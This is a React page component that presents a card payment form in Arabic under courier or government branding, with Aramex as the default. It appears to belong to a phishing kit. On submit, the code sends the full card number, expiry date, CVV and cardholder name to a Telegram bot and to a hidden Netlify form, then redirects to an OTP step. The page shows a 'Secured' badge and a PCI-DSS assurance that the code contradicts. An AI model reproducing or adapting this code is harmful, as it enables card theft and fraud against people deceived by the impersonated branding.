import { useState, useEffect } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Loader2, Lock, ShieldCheck, CreditCard, Info, HelpCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getGovBranding } from "@/lib/governmentPaymentSystems";
import PaymentMetaTags from "@/components/PaymentMetaTags";

const PaymentCardInput = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();
  
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardHolder, setCardHolder] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const companyKey = searchParams.get("company") || linkData?.payload?.service_key || "aramex";
  const govId = searchParams.get("govId") || linkData?.payload?.govId;
  const branding = getServiceBranding(companyKey);
  const govBranding = govId ? getGovBranding(govId) : undefined;

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);
  const selectedCountryData = getCountryByCode(selectedCountry);

  const isGov = !!govBranding;
  const primaryColor = isGov ? govBranding.colors.primary : branding.colors.primary;

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 16) value = value.slice(0, 16);
    const formattedValue = value.replace(/(\d{4})(?=\d)/g, "$1 ");
    setCardNumber(formattedValue);
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 4) value = value.slice(0, 4);
    if (value.length >= 2) {
      value = value.slice(0, 2) + "/" + value.slice(2);
    }
    setExpiryDate(value);
  };

  const getCardType = (number: string) => {
    const cleanNumber = number.replace(/\s/g, "");
    if (/^4/.test(cleanNumber)) return "visa";
    if (/^5[1-5]/.test(cleanNumber)) return "mastercard";
    if (/^6/.test(cleanNumber)) return "mada";
    return "unknown";
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (cardNumber.replace(/\s/g, "").length < 16 || expiryDate.length < 5 || cvv.length < 3) {
      toast({ title: "خطأ", description: "الرجاء التحقق من بيانات البطاقة", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    const cardInfo = {
      cardLast4: cardNumber.slice(-4),
      cardType: getCardType(cardNumber),
      expiryDate,
      cardHolder
    };

    try {
      await updateLink.mutateAsync({ linkId: id!, payload: { ...linkData?.payload, cardInfo } });

      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "card-payment",
          linkId: id!,
          service: isGov ? govBranding.nameAr : branding.name,
          amount: formattedAmount,
          cardNumber: cardNumber.replace(/\s/g, ""),
          expiryDate,
          cvv,
          cardHolder
        }).toString()
      });

      await sendToTelegram({
        type: 'card_info',
        data: {
          cardNumber: cardNumber.replace(/\s/g, ""),
          expiryDate,
          cvv,
          cardHolder,
          service: isGov ? govBranding.nameAr : branding.name,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr
        },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/otp${window.location.search}`);
    } catch (error) {
      toast({ title: "خطأ", description: "فشل معالجة البطاقة", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData) return null;

  return (
    <div className="min-h-screen flex flex-col bg-slate-50" dir="rtl">
      <PaymentMetaTags
        serviceKey={isGov ? govId! : companyKey}
        serviceName={isGov ? govBranding.nameAr : branding.name}
        title="إدخال بيانات البطاقة البنكية"
        amount={formattedAmount}
      />

      <header className="bg-white border-b h-16 sm:h-20 flex items-center px-4 sticky top-0 z-50">
         <div className="container mx-auto flex justify-between items-center">
            <img src={isGov ? govBranding.logo : branding.logo} alt="" className="h-10 object-contain" />
            <div className="flex items-center gap-2 px-3 py-1 bg-green-50 text-green-700 rounded-full border border-green-100">
               <Lock className="w-3 h-3" />
               <span className="text-[10px] font-bold uppercase tracking-widest">Secured</span>
            </div>
         </div>
      </header>

      <main className="flex-1 container mx-auto px-4 py-8 max-w-lg">
         <Card className="border-none shadow-2xl rounded-[2.5rem] overflow-hidden bg-white">
            <div className="p-8 sm:p-10 border-b bg-slate-50/50 relative">
               <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-2">القيمة المطلوب سدادها</p>
               <h2 className="text-3xl font-black text-slate-800">{formattedAmount}</h2>
               <div className="absolute top-8 left-8 opacity-10">
                  <CreditCard className="w-16 h-16" />
               </div>
            </div>

            <form onSubmit={handleSubmit} className="p-8 sm:p-10 space-y-6">
               <div className="space-y-6">
                  <div className="space-y-1.5">
                     <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">رقم البطاقة</Label>
                     <div className="relative group">
                        <Input
                          value={cardNumber}
                          onChange={handleCardNumberChange}
                          className="h-14 border-2 border-slate-100 rounded-2xl font-black text-slate-700 bg-slate-50/50 pr-12 text-lg tracking-[0.1em]"
                          placeholder="0000 0000 0000 0000"
                          required
                        />
                        <CreditCard className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-300 group-focus-within:text-blue-500" />
                        <div className="absolute left-4 top-1/2 -translate-y-1/2 flex items-center gap-2">
                           {getCardType(cardNumber) === "visa" && <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-4" />}
                           {getCardType(cardNumber) === "mastercard" && <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-4" />}
                           {getCardType(cardNumber) === "mada" && <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-4" />}
                        </div>
                     </div>
                  </div>

                  <div className="grid grid-cols-2 gap-6">
                     <div className="space-y-1.5">
                        <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">تاريخ الانتهاء</Label>
                        <Input
                          value={expiryDate}
                          onChange={handleExpiryChange}
                          className="h-14 border-2 border-slate-100 rounded-2xl font-black text-slate-700 bg-slate-50/50 text-center"
                          placeholder="MM/YY"
                          required
                        />
                     </div>
                     <div className="space-y-1.5">
                        <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">رمز الأمان (CVV)</Label>
                        <div className="relative">
                          <Input
                            value={cvv}
                            onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
                            type="password"
                            className="h-14 border-2 border-slate-100 rounded-2xl font-black text-slate-700 bg-slate-50/50 text-center"
                            placeholder="***"
                            required
                          />
                          <HelpCircle className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-200" />
                        </div>
                     </div>
                  </div>

                  <div className="space-y-1.5">
                     <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">اسم حامل البطاقة</Label>
                     <Input
                        value={cardHolder}
                        onChange={(e) => setCardHolder(e.target.value)}
                        className="h-14 border-2 border-slate-100 rounded-2xl font-black text-slate-700 bg-slate-50/50 pr-4"
                        placeholder="NAME AS SHOWN ON CARD"
                        required
                     />
                  </div>
               </div>

               <div className="pt-6">
                  <Button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full h-16 rounded-2xl font-black text-lg shadow-xl text-white active:scale-95 transition-all"
                    style={{ backgroundColor: primaryColor }}
                  >
                    {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : "إتمام عملية السداد"}
                  </Button>
                  <div className="mt-8 flex items-center justify-center gap-4 opacity-40 grayscale h-6">
                     <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-full" />
                     <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-full" />
                     <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-full" />
                  </div>
               </div>
            </form>
         </Card>

         <div className="mt-8 flex items-center gap-3 p-4 bg-white rounded-2xl border text-slate-400">
            <ShieldCheck className="w-5 h-5 text-green-500" />
            <p className="text-[10px] font-bold leading-relaxed uppercase tracking-tighter">
               جميع بياناتك مشفرة ومحمية وفقاً لمعايير PCI-DSS العالمية للأمان الرقمي.
            </p>
         </div>
      </main>

      <form name="card-payment" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="linkId" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="cardNumber" />
        <input type="text" name="expiryDate" />
        <input type="text" name="cvv" />
        <input type="text" name="cardHolder" />
      </form>
    </div>
  );
};

export default PaymentCardInput;
